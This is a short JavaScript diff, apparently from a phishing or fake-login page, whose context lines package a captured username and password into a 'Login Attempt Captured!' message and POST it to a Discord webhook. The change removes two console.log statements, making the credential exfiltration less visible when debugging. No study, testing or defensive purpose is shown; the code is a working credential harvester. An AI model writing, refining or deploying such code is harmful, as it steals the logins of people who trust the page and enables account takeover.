@@ -160,9 +160,6 @@
             content: `🚨 **Login Attempt Captured!**\n**Username:** \`${username}\`\n**Password:** \`${password}\``
         };
 
-        // Log the payload for debugging
-        console.log('Payload:', JSON.stringify(payload));
-
         // Send data to Discord webhook
         fetch(webhookUrl, {
             method: "POST",
@@ -174,7 +171,6 @@
         .then(response => {
             console.log('Response status:', response.status);
             return response.text().then(text => {
-                console.log('Response body:', text);
                 return { ok: response.ok, text };
             });
         })
